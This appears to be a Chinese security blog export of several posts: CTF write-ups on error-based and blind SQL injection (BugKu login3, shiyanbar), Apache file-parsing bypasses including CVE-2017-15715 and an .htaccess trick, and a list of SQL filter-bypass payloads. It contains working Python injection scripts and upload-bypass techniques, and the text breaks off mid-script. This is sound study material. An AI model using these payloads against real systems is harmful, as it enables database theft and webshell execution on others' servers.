    <content type="text"><![CDATA[实验吧 WEB 加了料的报错注入 打开页面是post注入，又是报错注入。所以就用到了burp，后来发现burp不好用，加了消息头也不好用，不知道为啥。既然是post那么就用脚本吧。 1.首先正常传参： 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1",'password':"1"&#125;)print(s.text) 2.看看是否能够绕过：(其实这道题比较简单毕竟是直接给你了源码比较好绕过) 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"'or '1",'password':"'or '1"&#125;)print(s.text) 查看回显，呦呵有点东西哈。sql语句在这里就不解释了，很简单。然后我又尝试了一个语句：很明显这个语句跟上一个的语句一样，但是结果出现了sql注入检查 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1' and",'password':"'or 1='1"&#125;)print(s.text) ###注入开始既然是加了料的报错，肯定是过滤了而且是报错。再次之前请允许小白在复习一次报错注入。 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+",'password':"'or '1"&#125;)print(s.text) 被检测到了一看就是被过滤了，加了料的嘛！那我们肯定就需要检查过滤函数，进行模糊测试啥的比如burp，但是burp又不好使。。。。emmmmmmmmmmmmmmmmm。（这里先绕过）对经常使用的报错注入函数updatexml进行测试。在密码中禁止对updatexml的使用，但是用户名并没有禁止。因此通过updatexml在存储非XPath格式的字符串时的报错输出获得所需要的信息。接下来就开始试后台的过滤逻辑，实验中发现：username中不允许使用()，也就是说无法使用函数，那报错注入岂不是没有办法做了？那用password注入呢？因为后台逻辑要查询两个字段，所以password字段在这道题里也可以注入。发现password中不允许使用floor、extractvalue等这些报错函数，也就是说报错注入在password这里也做不了了。也就是说，我们可以username里写报错函数名，password里写剩下的语句，但是这样会有多余的’andpassword=‘那要怎么做呢？记得我们得知的SQL语句格式嘛？ where username=’???’ andpassword=’???’ 而sql语句中可以使用//注释掉中间的SQL语句。也就是说，我们可以使用//来解决这个问题，而且//也没有被吃掉，这叫做HTTP分割注入。**爆出数据库版本： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select version()))) and &apos;1&quot;&#125;)print(s.text) 爆出数据库名字： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select database()))) and &apos;1&quot;&#125;)print(s.text) 爆出表名： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where !table_schema&lt;&gt;&apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema in (十六进制)))) and &apos;1&quot;&#125;)print(s.text) PS：这里关于等号绕过使用了！ &lt;&gt; regexp 十六进制编码。]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制]]></title>
    <url>%2F2019%2F08%2F01%2Fapache%E6%9C%80%E6%96%B0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2017-15715-%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制 0x01 正则表达式中的’$’ apache这次解析漏洞的根本原因就是这个 $，正则表达式中，我们都知道$用来匹配字符串结尾位置，我们来看看菜鸟教程中对正则表达符$的解释： 1匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。 那么就明白了，在设置了 RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符 0x02 Linux环境 这里本地是debian系的kali linux，apache配置文件路径在/etc/apache2/下，apache2.conf是apache核心配置文件，由于我本地php作为apache的mod方式运行的，所以需要在mods-enabled目录下找到关于apache-php模块的配置：(关于apache和php之间的某些关系可以移步我的博客):找到对应的模板和软连接：php7.0.conf -&gt; ../mods-available/php7.0.conf 在这里补充一下软连接的含义吧：在Linux下当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的 目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。例如：ln -s /bin/less /usr/local/bin/less。linux下的软链接类似于windows下的快捷方式。 可以看见php7.0.conf是mods-available/php7.0.conf的软链接，配置如下： 1234567891011121314151617181920212223242526root@kali:/etc/apache2/mods-enabled# cat php7.0.conf&lt;FilesMatch ".+\.ph(p[3457]?|t|tml)$"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch ".+\.phps$"&gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default # To re-enable it's recommended to enable access to the files # only in specific virtual host or directory Require all denied&lt;/FilesMatch&gt;# Deny access to files without filename (e.g. '.php')&lt;FilesMatch "^\.ph(p[3457]?|t|tml|ps)$"&gt; Require all denied&lt;/FilesMatch&gt;# Running PHP scripts in user directories is disabled by default# # To re-enable PHP in user directories comment the following lines# (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it# prevents .htaccess files from disabling it.&lt;IfModule mod_userdir.c&gt; &lt;Directory /home/*/public_html&gt; php_admin_flag engine Off &lt;/Directory&gt;&lt;/IfModule&gt; 第一行就告诉了我们apache会将哪些后缀的文件当做php解析：&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;以如下方式结尾的文件会被apache当做php解析： 1234567phpphp3php4php5php7phtphtml 如果我们再结合我们上面提到的关于$的使用，很容易想到，如果后缀名是上面这些后缀名以换行符结尾，那么也是可以解析的，本地构造文件：文件构造好了，从浏览器打开试试看看能不能解析： 补充一下Linux的知识：开启Apache服务在终端输入”vim /etc/apache2/ports.conf” -&gt; 键盘输入i 进入插入编辑模式 -&gt; 修改apache2默认监听端口号为8080 -&gt; 编辑好后，按Esc键+”:wq”保存退出 -&gt; 在终端输入”/etc/init.d/apache2 start” 0x02 Windows环境关于windows环境，p牛博客下面有一些人说测试失败，我也进行了测试，虚拟机环境 win7+phpstudy : Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45配置文件(${Apache_path}/conf/extra/httpd-php.conf)如下： 123456789LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5ts.dll&quot;LoadModule php5_module &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5apache2_4.dll&quot;&lt;IfModule php5_module&gt;PHPIniDir &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/&quot;&lt;/IfModule&gt;LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/libssh2.dll&quot;&lt;FilesMatch &quot;\.php$&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 用p牛的代码测试： 12345678910111213141516171819&lt;html&gt;&lt;body&gt; &lt;form action="test.php" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="text" name="name" /&gt; &lt;input type="submit" value="上传文件" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif(isset($_FILES['file'])) &#123; $name = basename($_POST['name']); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) &#123; exit('bad file'); &#125; move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);&#125;?&gt; 抓包修改文件名，上传：可以看见，这里出现了两个warning，其实并非测试不成功，可以看见其实是绕过了我们代码里的黑名单的，已经执行到了move_uploaded_file了，说明程序并没有因为没有绕过黑名单而exit，但是因为涉及到文件读写，而windows操作系统不允许后缀以换行符结尾的文件命名方式，所以这里会文件会创建失败，就出现了这两个warning了。 总结:研究这个漏洞的过程中遇到几个问题：1.获取文件名时不能用$_FILES[‘file’][‘name’]，因为他会自动把换行去掉，这一点有点鸡肋2.默认的Apache配置即可利用，因为默认Apache配置就使用了： 123&lt;FilesMatch \.php$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 所以理论上，只要用正则来匹配后缀进行php解析的Apache就有这个问题。而这个做法刚好是为了解决Apache老的解析漏洞而做的，可谓非此即彼，必然存在一种解析漏洞。]]></content>
      <categories>
        <category>CTF</category>
        <category>i春秋</category>
      </categories>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP和Apache是如何通信的?]]></title>
    <url>%2F2019%2F08%2F01%2FPHP%E5%92%8CApache%E6%98%AF%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1%E7%9A%84%2F</url>
    <content type="text"><![CDATA[apache与php沟通的三种方式 php与apache的主要沟通方式就分为了如下的三种方式cgi模式模块化方式fastcgi模式 cgi模式 cgi定义与说明:我们先来通俗的解释一下什么是cgi,首先cgi是一种规范，汉化的解释为通用的网关接口，其实就是web服务器与php之间的一个翻译机，当web服务器接收到一个请求过来的时候，如果你是用的这种方式，因为浏览器是只能识别html或者其他静态信息的，所以cgi就会给你做出php代码的转换，那么这个程序位于哪里呢？以phpstudy为例 ，位于php的bin目录会看到这个可执行程序。那具体的在apache里应该怎么来配置呢？ 对 PHP 5 用这行： Action application/x-httpd-php “/php/php-cgi.exe” 模块化方式 模块化方式通俗解释：在模块化(DLL)中，PHP是与Web服务器一起启动并运行的，再通俗点说两者是同一个进程的方式在运行，那么具体怎么配置呢？ 对 PHP 5 用这两行： 123 LoadModule php5_module “c:/php/php5apache2.dll” AddType application/x-httpd-php .php 配置 php.ini 的路径 1 PHPIniDir “C:/php” TIP：配置apache以运行php程序 第一步：装载php”模块”,”模块”就是指php的语言包，即我们下载解压后的php文件目录。将此目录改名为”php”复制到amp目录下（和apache目录同级），然后打开apache的配置文件httpd.conf,该文件在amp\Apache\conf目录下。在配置文件中插入如下代码： 1234LoadModule php_module &quot;E:/amp/php/php7apache2_4.dll&quot;&lt;FilesMatch &quot;\.php$\&quot;&gt;setHandler application/x-httpd-php&lt;/FilesMatch&gt; 该配置文件的代码作用是，告知appache，凡是带.php后缀的文件都要找php语言模块处理,”php7apache2_4.dll”文件在amp\php目录下还有另一种配置方式:AddType application/x-httpd-php .php .pap .phtml这些.pap .phtml 是我们自定义的文件后缀，同样也可以用php模块处理 fastcgi 说白点fastcgi也是一种协议，它是一个cgi的管理者，那么它的具体实现到php中就是php的php-fpm模块，但是在apache中是用的专门的fastcgi模块，需要下载.so文件，php-fpm在php5.3以后不再作为第三方的模块而是集成到了php中，它会提前的开启多个cgi程序，管理这些进程，并提供方式合理有效的调度，保证了并发性。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件解析漏洞总结-Apache]]></title>
    <url>%2F2019%2F08%2F01%2F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-Apache%2F</url>
    <content type="text"><![CDATA[文件解析漏洞总结-Apache 百度许久，又谷歌一番，最终发觉，Apache关于文件解析，似乎只有三种“漏洞”。之所以打引号是因为我觉得这三种“漏洞”都不是Apache的漏洞，只是其特性，而很多程序员不了解这种特性，故而写出有问题的代码，这才给黑客可趁之机，造成漏洞。但大家都称呼这是Apache的文件解析漏洞，我也只好随大流了。1.多后缀名先说第一种特性：多后缀名。这是怎么的一种鲜为人知的特性呢？原来是这样的，Apache认为，一个文件可以有多个后缀，如：werner.txt.png.mp3。这一文件，放在Windows里，毫无疑问，就是个mp3文件，Windows只认最后一个“.”及其后面的字符“mp3”，觉得该文件后缀为“.mp3”，这也是大多数操作系统、应用软件的处理方式、是正常人习惯。而在Apache中，则可能有所不同，如果有必要，Apache会从后（右）往前（左），一一辨别后缀。何时有必要？当Apache不认识某个后缀时，便有必要。如某文件名为：werner.mp3.html.qwe.arex，Apache在处理时，先读取最后一个后缀，为“.arex”，一看，这啥玩意啊，不认识，继续读取下一个后缀“.qwe”，一看，呀，这又是啥，还是不认识，继续读下一个后缀“.html”，一看，哦，这是个超文本标记语言文件，俗称网页文件，这回认识了，也就不继续读下一个后缀了。若是所有后缀都看完了没有一个认识怎么办？此时就会把该文件当做默认类型进行处理了，一般来说，默认类型是text/plain。据说在Apache的配置文件中搜索“DefaultType”就能看到默认类型的明确定义了，但我却不知为何，没有找到。哪些后缀Apache认识，哪些不认识？有一个名为mime.types的文件，其中记录着Apache认识的后缀。在Ubuntu下，该文件位于/etc/mime.types，在Windows下，该文件位于C:/apache/conf/mime.types（类似这样的，注意Apache的安装路径）。该文件是一个一对多的映射表，定义了某一种文件类型，对应的几种后缀。除了该文件，在Apache的配置文件中，还可以用AddCharset语句添加映射，如： 12AddCharset us-ascii .ascii .us-asciiAddCharset ISO-2022-CN .iso2022-cn .cis mime.types是个很长的文件，大概看了下，Apache认识的后缀比我多多了。节选部分如下所示： 123456789101112application/java-archive jarapplication/m3g m3gapplication/java-vm classapplication/javascript jsapplication/json jsontext/html html htm shtmltext/x-diff diff patchvideo/x-flv flvvideo/x-la-asf lsf lsxvideo/x-mng mngvideo/x-ms-asf asf asxvideo/x-ms-wm wm 这一特性会带来什么问题呢？网站往往有上传文件的功能，但一定不想让用户上传程序，因为这很可能会危害网站安全，故而会检查上传文件的后缀名，若是.php，则拒绝上传（假设这是个php站）。此时用户只需上传文件evildoer.php.qwe，若是程序员不了解Apache的这一特性，编写的程序检查后缀时只看“.qwe”，而认为这不是程序文件，允许上传，则用户成功地绕过了上传时的安全检查，上传了php程序文件。该文件的最后一个后缀“.qwe”是Apache不认识的，故而Apache会以倒数第二个后缀“.php”为准，把该文件当做是php文件，解析执行。 这总是奏效的吗？按理来说，由于这是特性而不是漏洞，所以适用于所有版本的Apache。这一奇怪的特性，说不定正是Apache的自豪之处呢。但是，在我的测试中却发现，类似aaa.php.xxx的文件并不会被作为php程序执行，而是被当成文本文件，返回给浏览器，在浏览器中可以看到php源码，而不是执行结果。测试环境是Ubuntu14.04+Apache2.4.7+php5。 这是怎么回事？难道前面几百字都是废话，说的是错的？我们来做个实验。准备一个文件，内容随意，命名为test.jpg.aaa，放置在Apache中，然后在浏览器中访问它，结果如下图所示：可见浏览器是将该文件作为图片处理的。浏览器为何认为test.jpg.aaa是图片呢？aaa可不是图片文件的后缀。这是因为服务器的响应HTTP头中的Content-Type字段值为image/jpeg，浏览器看到image/jpeg，便知这是图片文件。这说明服务器（此处即Apache）是把test.jpg.aaa当做图片的，也说明，前面分析的Apache的多后缀处理是没有错的。 那么aaa.php.xxx为何没有被作为php代码执行呢？我猜是这样的，当然只是我的猜测，实在是找不到相关资料，只好猜了。Apache看到文件aaa.php.xxx，按照多后缀名的解析规则，认为该文件是php程序文件，把该文件作为php程序文件处理。怎么处理呢？交给php解释器，Apache本身并不懂php。而php解释器却有着和Apache不同的后缀解析规则，可能只认最后一个后缀，故而认为aaa.php.xxx不是php程序文件，拒绝执行。在我的测试环境中，php以模块（module）的模式工作于Apache的领导下。这种模式下php接受到领导Apache分配的任务——aaa.php.xxx，一看，不是php程序文件，没法执行，但也没有报错，而是返回了文件内容本身。php还可以以FASTCGI的模式工作于Apache中，此种模式下php遇到类似aaa.php.xxx这种不是php程序的文件，会触发500错误。 php本身是如何识别文件的呢？我在Apache的模块的配置文件中找到了php5.conf，内容如下： 123456789101112131415161718192021222324252627&lt;FilesMatch ".+\.ph(p[345]?|t|tml)$"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch ".+\.phps$"&gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default # To re-enable it's recommended to enable access to the files # only in specific virtual host or directory Order Deny,Allow Deny from all&lt;/FilesMatch&gt;# Deny access to files without filename (e.g. '.php')&lt;FilesMatch "^\.ph(p[345]?|t|tml|ps)$"&gt; Order Deny,Allow Deny from all&lt;/FilesMatch&gt;# Running PHP scripts in user directories is disabled by default## To re-enable PHP in user directories comment the following lines# (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it# prevents .htaccess files from disabling it.&lt;IfModule mod_userdir.c&gt; &lt;Directory /home/*/public_html&gt; php_admin_flag engine Off &lt;/Directory&gt;&lt;/IfModule&gt; 阅读上示配置文件可知，被当做php程序执行的文件名要符合正则表达式：”.+.ph(p[345]?|t|tml)”，其中“”符号在正则中匹配结束，故而可知php本身确实是只看最后一个后缀的。就算Apache把某文件当php程序，php自己不认它，也是无用。进一步试验，把php5.conf文件中刚刚提到的正则表达式的“$”换成“.”，即：&quot;.+\.ph(p[345]?|t|tml)\.&quot;,然后重启Apache使配置文件生效，再在浏览器中访问aaa.php.xxx，这次，aaa.php.xxx果然被当做php程序执行了，在浏览器中，看到的是程序执行结果而不是源码。这也从侧面验证了，我的猜测是正确的。测试完之后，一定要记得改回去。2.罕见后缀计算机世界自开天辟地以来，便自由多彩。还记得mime.types文件吗？在该文件中搜索“php”这三个字母，结果如下所示： 1234567werner@Yasser:~$ cat /etc/mime.types | grep php#application/x-httpd-php phtml pht php#application/x-httpd-php-source phps#application/x-httpd-php3 php3#application/x-httpd-php3-preprocessed php3p#application/x-httpd-php4 php4#application/x-httpd-php5 php5 还记得正则表达式”.+.ph(p[345]?|t|tml)$”吗，该正则表达式匹配的不仅仅有php，还有php3、php4、php5、pht和phtml。 好吧，原来不仅php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀。我原本只知道“.php”的，真是大开眼界。这就好比，不仅py是Python程序文件的后缀，还有pyc和pyo也都是。写上传过滤规则的程序员是否博学多识，也知道这些知识呢？我想，大抵是不知道的。利用这些“罕见”的后缀名，也可能绕过安全检查，干些“坏事”。 我在Ubuntu14.04+Apache2.4.7中进行测试，先准备文件text.php，其内容是经典的Hello World：&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以php、phtml、pht、php3、php4和php5为后缀，能成功看到“HELLO WORLD”；以phps为后缀，会报403错误，Forbidden；以php3p为后缀，会在浏览器中看到源码。 3.妙用.htaccess.htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）。 要想使.htaccess文件生效，需要两个条件，一是在Apache的配置文件中写上：AllowOverride All若这样写则.htaccess不会生效：AllowOverride None二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so需要注意Apache可能有多个配置文件，后加载的配置文件会覆盖先加载的配置文件中的配置。所以在某个配置文件中将AllowOverride设置成All，若是其后加载的某个配置文件中AllowOverride的设置是None，则也是没有用的。一般来说，先加载httpd.conf，再加载conf.d/中的配置文件，最后加载sites-enabled/中的配置文件。 这意味着，.htaccess并不总是有效的。而且不幸的是，在我的测试环境中.htaccess默认无效。好吧，为了测试，我只好将它改为有效。以下讨论均在.htaccess有效的前提下进行。 .htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：AddType application/x-httpd-php xxx就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。另一种写法是： 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 该语句会让Apache把shell.jpg文件解析为php文件。下面是一次测试，测试前已经打开Apache对.htaccess文件的支持。在网站根目录中准备如下文件树： 12345678910│├── htaccess_test/│ ├── .htaccess│ ├── shell.jpg│ ├── type.xxx│ └── test/│ ├── shell.jpg│ └── type.xxx├── shell.jpg└── type.xxx 其中，文件.htaccess的内容为： 12345AddType application/x-httpd-php xxx&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 文件shell.jpg和type.xxx的内容相同，均为：&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;然后在浏览器中访问各文件，结果如下表所示：]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>解析漏洞</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql注入中的绕过]]></title>
    <url>%2F2019%2F07%2F30%2Fsql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[sql注入绕过详解。 一、SQL注入逗号绕过 1.联合查询显注绕过逗号在联合查询时使用 UNION SELECT 1,2,3,4,5,6,7..n 这样的格式爆显示位，语句中包含了多个逗号，如果有WAF拦截了逗号时，我们的联合查询不能用了。绕过在显示位上替换为常见的注入变量或其它语句 12345union select 1,2,3;union select * from ((select 1)A join (select 2)B join (select 3)C）;union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir))C); 在数据库中演示联合查询UNION开始是我们在URL中注入的语句，这里只是演示，在实际中如果我们在注入语句中有逗号就可能被拦截 1234567mysql&gt; select user_id,user,password from users union select 1,2,3;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 1 | 2 | 3 |+---------+-------+----------------------------------+2 rows in set (0.04 sec) 不出现逗号，使用Join来注入 12345678mysql&gt; select user_id,user,password from users union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);;+---------+-------+-------------------------------------------------+| user_id | user | password |+---------+-------+-------------------------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 1 | 2 | root@192.168.228.1 dvwa c:\phpStudy\MySQL\data\ |+---------+-------+-------------------------------------------------+2 rows in set (0.08 sec) 2.盲注中逗号绕过MID 和substr 函数用于从文本字段中提取字符 1234567mysql&gt; select mid(user(),1,2);+-----------------+| mid(user(),1,2) |+-----------------+| ro |+-----------------+1 row in set (0.04 sec) 查询数据库用户名第一个字符的ascii码 1234567mysql&gt; select user_id,user,password from users union select ascii(mid(user(),1,2)),2,3;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 114 | 2 | 3 |+---------+-------+----------------------------------+2 rows in set (0.05 sec) 盲注，通过猜ascii值 12345678910mysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=115) ;Empty setmysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=114) ;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |+---------+-------+----------------------------------+1 row in set (0.04 sec) 逗号绕过SUBTTRING 函数substring(str FROM pos)从字符串str的起始位置pos 返回一个子串 12345678910111213mysql&gt; select substring(&apos;hello&apos; from 1);+---------------------------+| substring(&apos;hello&apos; from 1) |+---------------------------+| hello |+---------------------------+1 row in set (0.04 sec)mysql&gt; select substring(&apos;hello&apos; from 2);+---------------------------+| substring(&apos;hello&apos; from 2) |+---------------------------+| ello |+---------------------------+1 row in set (0.03 sec) 注入 1234567891011mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=114) ;Empty set//substring(user() from 2)为o(这句话是错误的)//o的ascii为111，mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=111) ;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |+---------+-------+----------------------------------+1 row in set (0.03 sec) PS：这里要注意：substring(user() from 2) 是从第二个字母向后内容，而ascii函数取得首字母的数值。所以这两个函数要联合起来使用3.绕过逗号还可以使用：limit offset： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 select * from table limit 2,1;//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据 select * from table limit 2 offset 1;//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条 二、sql注入比较符号（&lt;&gt;）绕过： 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：select * from users where id=1 and ascii(substr(database(),0,1))&gt;64此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 三、sql注入 or and 绕过： and=&amp;&amp; or=|| 四、sql注入注释符号（#，–）绕过 id=1&#39; union select 1,2,3||&#39;1最后的or ‘1闭合查询语句的最后的单引号，或者：id=1&#39; union select 1,2,&#39;3]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu--login3(SKCTF)]]></title>
    <url>%2F2019%2F07%2F30%2FBugKu-login3-SKCTF%2F</url>
    <content type="text"><![CDATA[看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。 所以我们开始注入：首先我们输入admin’:输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。接着我们就需要绕过过滤字符：括号绕过空格：如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如： select(user())from dual where(1=1)and(2=2) 这种过滤方法常常用于time based盲注,例如： ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 逗号绕过（使用from或者offset）： 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1);select mid(database() from 1 for 1); 等于号=： 用&lt;&gt;(不等于)绕过。按照以上思路我们使用： ascii(substr(database() from 1 for 1)),但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。 如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。我们写脚本爆出数据库： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''for i in range(1,11): for j in all_string: print('checking '+j) data = &#123; 'username':"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: database = database + j print('the '+str(i)+' place of database is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(database) 本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜 看别人猜的表名为admin，列名为password，真是玄学… 那就直接爆password：接着们爆出表： 123456789101112131415161718192021import requestsurl = 'http://123.206.31.85:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''password = ''for i in range(1,51): for j in all_string: print('checking '+j) data = &#123; 